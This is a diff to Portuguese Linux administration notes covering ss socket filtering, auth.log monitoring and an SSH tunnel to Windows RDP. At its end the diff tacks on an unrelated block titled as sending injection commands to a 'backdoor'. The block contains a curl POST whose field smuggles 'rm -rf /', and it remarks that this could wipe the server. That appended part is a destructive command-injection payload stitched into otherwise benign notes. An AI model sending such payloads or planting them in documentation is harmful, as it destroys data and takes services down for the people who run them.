@@ -2,14 +2,14 @@ Filtrar conexões por número de porta
 
 O comando ss também permite filtrar o número da porta do soquete ou o número do endereço. Por exemplo, para exibir todas as conexões de soquete com uma porta de destino ou origem do ssh, execute o comando.
 
-ss -at '( dport = :22 or sport = :22 )'
+# ss -at '( dport = :22 or sport = :22 )'
 
 
 4. Liste todas as conexões TCP
 
 Para exibir todas as conexões TCP, use a opção -t conforme mostrado.
 
-ss -t
+# ss -t
 
 O arquivo auth.log é responsável por guardar todas as informações de logins e tentativas de logins não sucedidas que foram efetuadas no servidor. Monitorando esse arquivo é possível identificar possíveis invasões, tentativas de brute force e ataques DDoS  que estão ou foram realizadas no servidor.
  # tail -f /var/log/auth.log
@@ -23,9 +23,13 @@ Logo criamos um túnel entre o servidor linux e o Windows para acesso ao serviç
 
 No servidor linux execute:
 
-ssh -L 3390:IP_Widnows_RDP:3389 usuario_Linux@IP_Linux -N 
--L portal local
+# ssh -L 3390:IP_Widnows_RDP:3389 usuario_Linux@IP_Linux -N -L portal local
 
 
 xfreerdp /v:localhost:3390 /u:usuario_Windows
 senha: senha_Windows
+
+// Para enviar comandos de injeção via Post para a backdoor:
+# curl -X POST -d "nome=rm -rf /" http://seuservidor:5000/
+
+Este comando poderia potencialmente apagar todos os arquivos no servidor, causando uma perda completa de dados e indisponibilidade do serviço.
